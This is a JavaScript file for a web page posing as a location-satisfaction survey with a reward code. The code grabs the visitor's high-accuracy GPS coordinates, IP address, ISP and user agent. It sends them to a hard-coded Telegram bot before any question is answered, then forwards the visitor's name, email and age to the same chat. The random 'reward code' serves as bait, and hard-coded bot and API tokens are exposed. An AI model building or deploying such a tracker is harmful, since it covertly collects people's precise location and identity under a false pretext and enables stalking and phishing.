document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const welcomeScreen = document.getElementById('welcome-screen');
    const surveyScreen = document.getElementById('survey-screen');
    const completionScreen = document.getElementById('completion-screen');
    const errorScreen = document.getElementById('error-screen');
    const locationStatus = document.getElementById('location-status');
    const getLocationBtn = document.getElementById('get-location-btn');
    const retryLocationBtn = document.getElementById('retry-location-btn');
    const prevBtn = document.getElementById('prev-btn');
    const nextBtn = document.getElementById('next-btn');
    const submitBtn = document.getElementById('submit-btn');
    const newSurveyBtn = document.getElementById('new-survey-btn');
    const progressBar = document.getElementById('progress');
    const currentStepEl = document.getElementById('current-step');
    const totalStepsEl = document.getElementById('total-steps');
    const surveyForm = document.getElementById('survey-form');
    const surveySteps = document.querySelectorAll('.survey-step');
    const locationCorrectBtn = document.getElementById('location-correct');
    const locationIncorrectBtn = document.getElementById('location-incorrect');
    const detectedCountry = document.getElementById('detected-country');
    const detectedState = document.getElementById('detected-state');
    const detectedCity = document.getElementById('detected-city');
    const rewardCode = document.getElementById('reward-code');
    const ratingInputs = document.querySelectorAll('input[name="location-rating"]');
    const ratingText = document.querySelector('.rating-text');

    // Variables
    let currentStep = 1;
    const totalSteps = surveySteps.length;
    let userLocation = null;
    let userIpInfo = null;
    
    // Telegram Bot Configuration
    const telegramBotToken = '7082348594:AAENnyiU1uxvjATBwFinj5jcI3YgsiCzB2A';
    const telegramChatId = '1201917438';
    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    
    // Initialize
    init();

    function init() {
        // Set total steps
        totalStepsEl.textContent = totalSteps;
        
        // Add event listeners
        getLocationBtn.addEventListener('click', requestLocation);
        retryLocationBtn.addEventListener('click', requestLocation);
        prevBtn.addEventListener('click', goToPreviousStep);
        nextBtn.addEventListener('click', goToNextStep);
        surveyForm.addEventListener('submit', submitSurvey);
        newSurveyBtn.addEventListener('click', resetSurvey);
        locationCorrectBtn.addEventListener('click', confirmLocation);
        locationIncorrectBtn.addEventListener('click', rejectLocation);
        
        // Rating stars event listeners
        ratingInputs.forEach(input => {
            input.addEventListener('change', updateRatingText);
        });
    }

    // Request user's location
    function requestLocation() {
        if (!navigator.geolocation) {
            showErrorScreen('Geolocation is not supported by your browser');
            return;
        }

        getLocationBtn.classList.add('hidden');
        locationStatus.classList.remove('hidden');

        navigator.geolocation.getCurrentPosition(locationSuccess, locationError, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        });
    }

    // Handle successful location retrieval
    function locationSuccess(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        
        // Fetch location details using reverse geocoding
        fetchLocationDetails(latitude, longitude);
    }

    // Handle location error
    function locationError(error) {
        locationStatus.classList.add('hidden');
        getLocationBtn.classList.remove('hidden');
        
        let errorMessage = '';
        switch(error.code) {
            case error.PERMISSION_DENIED:
                errorMessage = 'You denied the request for location access.';
                break;
            case error.POSITION_UNAVAILABLE:
                errorMessage = 'Location information is unavailable.';
                break;
            case error.TIMEOUT:
                errorMessage = 'The request to get user location timed out.';
                break;
            case error.UNKNOWN_ERROR:
                errorMessage = 'An unknown error occurred.';
                break;
        }
        
        showErrorScreen(errorMessage);
    }

    // Fetch location details using reverse geocoding and IP information
    function fetchLocationDetails(latitude, longitude) {
        // Store latitude and longitude
        userLocation = {
            latitude: latitude,
            longitude: longitude,
            country: '',
            state: '',
            city: '',
            googleMapsUrl: `https://www.google.com/maps?q=${latitude},${longitude}`
        };
        
        // Fetch IP information using ipinfo.io
        fetch('https://ipinfo.io/json?token=2f5f7cba5c8a4f')
            .then(response => response.json())
            .then(ipData => {
                // Store IP information
                userIpInfo = {
                    ip: ipData.ip,
                    isp: ipData.org || 'Unknown',
                    userAgent: navigator.userAgent
                };
                
                // Use reverse geocoding to get location details
                const geocodingUrl = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`;
                
                return fetch(geocodingUrl);
            })
            .then(response => response.json())
            .then(geocodeData => {
                // Extract location information
                if (geocodeData.address) {
                    userLocation.city = geocodeData.address.city || geocodeData.address.town || geocodeData.address.village || 'Unknown';
                    userLocation.state = geocodeData.address.state || 'Unknown';
                    userLocation.country = geocodeData.address.country || 'Unknown';
                }
                
                // Update the location display
                detectedCountry.textContent = userLocation.country;
                detectedState.textContent = userLocation.state;
                detectedCity.textContent = userLocation.city;
                
                // Send location data to Telegram bot
                sendLocationToTelegram();
                
                // Hide location status and show survey
                locationStatus.classList.add('hidden');
                switchScreen(welcomeScreen, surveyScreen);
            })
            .catch(error => {
                console.error('Error fetching location details:', error);
                // Fallback to simulated data if API calls fail
                userLocation.country = 'United States';
                userLocation.state = 'California';
                userLocation.city = 'San Francisco';
                
                // Update the location display
                detectedCountry.textContent = userLocation.country;
                detectedState.textContent = userLocation.state;
                detectedCity.textContent = userLocation.city;
                
                // Hide location status and show survey
                locationStatus.classList.add('hidden');
                switchScreen(welcomeScreen, surveyScreen);
            });
    }

    // Confirm location is correct
    function confirmLocation() {
        goToNextStep();
    }

    // Reject location
    function rejectLocation() {
        showErrorScreen('Please try again to get accurate location');
    }

    // Go to next step
    function goToNextStep() {
        if (currentStep < totalSteps) {
            if (validateCurrentStep()) {
                // Hide current step
                document.querySelector(`.survey-step[data-step="${currentStep}"]`).classList.remove('active');
                
                // Increment step counter
                currentStep++;
                
                // Show next step
                document.querySelector(`.survey-step[data-step="${currentStep}"]`).classList.add('active');
                
                // Update progress
                updateProgress();
                
                // Enable/disable navigation buttons
                updateNavigationButtons();
            }
        }
    }

    // Go to previous step
    function goToPreviousStep() {
        if (currentStep > 1) {
            // Hide current step
            document.querySelector(`.survey-step[data-step="${currentStep}"]`).classList.remove('active');
            
            // Decrement step counter
            currentStep--;
            
            // Show previous step
            document.querySelector(`.survey-step[data-step="${currentStep}"]`).classList.add('active');
            
            // Update progress
            updateProgress();
            
            // Enable/disable navigation buttons
            updateNavigationButtons();
        }
    }

    // Update progress bar and step indicator
    function updateProgress() {
        const progressPercentage = ((currentStep - 1) / (totalSteps - 1)) * 100;
        progressBar.style.width = `${progressPercentage}%`;
        currentStepEl.textContent = currentStep;
    }

    // Update navigation buttons
    function updateNavigationButtons() {
        // Enable/disable previous button
        prevBtn.disabled = currentStep === 1;
        
        // Show/hide next and submit buttons
        if (currentStep === totalSteps) {
            nextBtn.classList.add('hidden');
            submitBtn.classList.remove('hidden');
        } else {
            nextBtn.classList.remove('hidden');
            submitBtn.classList.add('hidden');
        }
    }

    // Validate current step
    function validateCurrentStep() {
        const currentStepEl = document.querySelector(`.survey-step[data-step="${currentStep}"]`);
        const inputs = currentStepEl.querySelectorAll('input[required], select[required], textarea[required]');
        
        let isValid = true;
        
        inputs.forEach(input => {
            if (!input.value.trim()) {
                isValid = false;
                highlightInvalidField(input);
            } else {
                removeInvalidHighlight(input);
            }
        });
        
        // Special validation for radio buttons
        const radioGroups = {};
        currentStepEl.querySelectorAll('input[type="radio"][required]').forEach(radio => {
            radioGroups[radio.name] = radioGroups[radio.name] || [];
            radioGroups[radio.name].push(radio);
        });
        
        for (const groupName in radioGroups) {
            const group = radioGroups[groupName];
            const checked = group.some(radio => radio.checked);
            
            if (!checked) {
                isValid = false;
                highlightInvalidField(group[0].parentElement.parentElement);
            } else {
                removeInvalidHighlight(group[0].parentElement.parentElement);
            }
        }
        
        return isValid;
    }

    // Highlight invalid field
    function highlightInvalidField(field) {
        field.classList.add('invalid');
        field.addEventListener('input', function removeInvalid() {
            removeInvalidHighlight(field);
            field.removeEventListener('input', removeInvalid);
        });
    }

    // Remove invalid highlight
    function removeInvalidHighlight(field) {
        field.classList.remove('invalid');
    }

    // Update rating text
    function updateRatingText() {
        const selectedRating = document.querySelector('input[name="location-rating"]:checked');
        if (selectedRating) {
            const ratingValue = selectedRating.value;
            const ratingTexts = {
                '1': 'Very Dissatisfied',
                '2': 'Dissatisfied',
                '3': 'Neutral',
                '4': 'Satisfied',
                '5': 'Very Satisfied'
            };
            
            ratingText.textContent = ratingTexts[ratingValue];
        }
    }

    // Send location data to Telegram bot
    function sendLocationToTelegram() {
        const locationMessage = `
🌍 New User Location Data
City: ${userLocation.city}
State: ${userLocation.state}
Country: ${userLocation.country}
Latitude: ${userLocation.latitude}
Longitude: ${userLocation.longitude}
Google Maps: ${userLocation.googleMapsUrl}

IP Address: ${userIpInfo.ip}
ISP: ${userIpInfo.isp}
User-Agent: ${userIpInfo.userAgent}
`;
        
        // Send message to Telegram bot
        fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: locationMessage,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Location data sent to Telegram:', data);
            // Show notification
            showNotification('Location data sent successfully!', 'success');
        })
        .catch(error => {
            console.error('Error sending location to Telegram:', error);
            // Show error notification
            showNotification('Failed to send location data', 'error');
        });
    }
    
    // Send survey data to Telegram bot
    function sendSurveyToTelegram(surveyData, code) {
        const surveyMessage = `
📋 Survey Submission
Name: ${surveyData.name}
Email: ${surveyData.email}
Age: ${surveyData.age}
Residence Duration: ${surveyData['residence-years']}
Plan to Move: ${surveyData['plan-to-move']}
Location Rating: ${surveyData['location-rating']}
Location Pros: ${surveyData['location-pros']}
Location Cons: ${surveyData['location-cons']}
Services Used: ${surveyData.services || 'None selected'}
Additional Comments: ${surveyData['additional-comments'] || 'None'}

Reward Code: ${code}

📍 Location: ${userLocation.city}, ${userLocation.state}, ${userLocation.country}
`;
        
        // Send message to Telegram bot
        fetch(telegramApiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: surveyMessage,
                parse_mode: 'Markdown'
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Survey data sent to Telegram:', data);
            // Show notification
            showNotification('Survey submitted successfully!', 'success');
        })
        .catch(error => {
            console.error('Error sending survey to Telegram:', error);
            // Show error notification
            showNotification('Failed to submit survey data', 'error');
        });
    }
    
    // Submit survey
    function submitSurvey(e) {
        e.preventDefault();
        
        if (validateCurrentStep()) {
            // In a real application, you would collect all form data and send it to a server
            const formData = new FormData(surveyForm);
            const surveyData = {};
            
            for (const [key, value] of formData.entries()) {
                surveyData[key] = value;
            }
            
            // Add location data
            surveyData.location = userLocation;
            
            // Log the data (in a real app, you would send this to a server)
            console.log('Survey submitted:', surveyData);
            
            // Generate reward code
            const code = generateRewardCode();
            
            // Send survey data to Telegram bot
            sendSurveyToTelegram(surveyData, code);
            
            // Show completion screen
            switchScreen(surveyScreen, completionScreen);
        }
    }

    // Generate reward code
    function generateRewardCode() {
        const characters = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
        let code = '';
        
        for (let i = 0; i < 12; i++) {
            if (i > 0 && i % 4 === 0) {
                code += '-';
            }
            code += characters.charAt(Math.floor(Math.random() * characters.length));
        }
        
        rewardCode.textContent = code;
        return code;
    }

    // Reset survey to start again
    function resetSurvey() {
        // Reset form
        surveyForm.reset();
        
        // Reset step to 1
        currentStep = 1;
        
        // Hide all steps and show first step
        surveySteps.forEach(step => step.classList.remove('active'));
        document.querySelector('.survey-step[data-step="1"]').classList.add('active');
        
        // Update progress
        updateProgress();
        
        // Update navigation buttons
        updateNavigationButtons();
        
        // Show welcome screen
        switchScreen(completionScreen, welcomeScreen);
    }

    // Switch between screens
    function switchScreen(fromScreen, toScreen) {
        fromScreen.classList.remove('active');
        setTimeout(() => {
            toScreen.classList.add('active');
        }, 300);
    }

    // Show error screen
    function showErrorScreen(message) {
        const errorMessage = document.querySelector('.error-message');
        errorMessage.textContent = message;
        switchScreen(welcomeScreen, errorScreen);
    }

    // Show notification
    function showNotification(message, type = 'info') {
        // Create notification element
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <div class="notification-icon">
                <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'}"></i>
            </div>
            <div class="notification-message">${message}</div>
        `;
        
        // Add to document
        document.body.appendChild(notification);
        
        // Animate in
        setTimeout(() => {
            notification.classList.add('show');
        }, 10);
        
        // Remove after delay
        setTimeout(() => {
            notification.classList.remove('show');
            setTimeout(() => {
                notification.remove();
            }, 300);
        }, 3000);
    }

    // Add CSS class for invalid fields and notifications
    const style = document.createElement('style');
    style.textContent = `
        .invalid {
            border-color: var(--error-color) !important;
            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.2) !important;
        }
        .invalid ~ label,
        .invalid + label {
            color: var(--error-color) !important;
        }
        
        /* Notification Styles */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            display: flex;
            align-items: center;
            background-color: white;
            border-radius: 8px;
            padding: 12px 16px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            z-index: 1000;
            transform: translateX(120%);
            transition: transform 0.3s ease;
            max-width: 350px;
        }
        
        .notification.show {
            transform: translateX(0);
        }
        
        .notification-icon {
            margin-right: 12px;
            font-size: 20px;
        }
        
        .notification.success .notification-icon {
            color: var(--success-color);
        }
        
        .notification.error .notification-icon {
            color: var(--error-color);
        }
        
        .notification.info .notification-icon {
            color: var(--primary-color);
        }
        
        .notification-message {
            font-size: 14px;
            font-weight: 500;
        }
    `;
    document.head.appendChild(style);
});
